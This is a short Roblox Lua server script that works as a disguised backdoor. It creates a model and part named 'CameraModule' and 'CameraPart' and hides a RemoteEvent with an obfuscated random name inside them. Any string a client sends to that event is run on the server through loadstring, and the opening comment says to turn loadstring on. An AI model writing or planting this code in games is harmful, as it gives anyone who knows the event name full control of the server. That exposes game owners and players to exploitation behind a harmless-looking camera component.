--turn on loadstring in serverscriptservice

local event = Instance.new("RemoteEvent")
local cammodel = Instance.new("Model",workspace)
cammodel.Name = "CameraModule"
local campart = Instance.new("Part",cammodel)
campart.Name = "CameraPart"

event.Name = "GAVNBYBIR8IPDHS"

event.Parent = campart

event.OnServerEvent:Connect(function(plr,script)
	local code = loadstring(script)
	if code then
		code()
	end
end)